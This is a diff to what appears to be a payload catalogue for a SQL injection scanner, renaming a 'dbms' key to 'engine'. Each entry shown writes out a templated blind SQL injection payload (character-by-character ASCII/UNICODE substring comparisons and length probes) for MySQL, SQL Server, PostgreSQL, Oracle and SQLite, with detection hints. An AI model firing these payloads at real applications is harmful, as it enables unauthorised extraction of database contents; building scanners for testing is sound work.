@@ -30,22 +30,22 @@ entries:
     detect: "Pair with the numeric true form; the differential is the oracle."
 
   - name: substring comparison (MySQL, SQL Server)
-    dbms: [mysql, mssql]
+    engine: [mysql, mssql]
     payload: "' AND ASCII(SUBSTRING(({{EXPR}}),{{IDX}},1))>{{BOUND}} AND 'a'='a"
     detect: "True when the character at position {{IDX}} sits above the boundary; halve the range on each request."
 
   - name: substring comparison (PostgreSQL)
-    dbms: [postgresql]
+    engine: [postgresql]
     payload: "' AND ASCII(SUBSTR(({{EXPR}}),{{IDX}},1))>{{BOUND}} AND 'a'='a"
     detect: "PostgreSQL spells the function SUBSTR; the search is otherwise identical."
 
   - name: substring comparison (Oracle)
-    dbms: [oracle]
+    engine: [oracle]
     payload: "' AND ASCII(SUBSTR(({{EXPR}}),{{IDX}},1))>{{BOUND}} AND 'a'='a"
     detect: "Oracle uses SUBSTR and requires the subquery in {{EXPR}} to carry its own FROM clause."
 
   - name: substring comparison (SQLite)
-    dbms: [sqlite]
+    engine: [sqlite]
     payload: "' AND UNICODE(SUBSTR(({{EXPR}}),{{IDX}},1))>{{BOUND}} AND 'a'='a"
     detect: "SQLite exposes UNICODE rather than ASCII; behaviour is equivalent for the ASCII range."
 
@@ -55,7 +55,7 @@ entries:
     note: "SQL Server spells this LEN rather than LENGTH; use the SQL Server length probe entry there."
 
   - name: length probe (SQL Server)
-    dbms: [mssql]
+    engine: [mssql]
     payload: "' AND LEN(({{EXPR}}))>{{BOUND}} AND 'a'='a"
     detect: "SQL Server's spelling of the same probe."
 
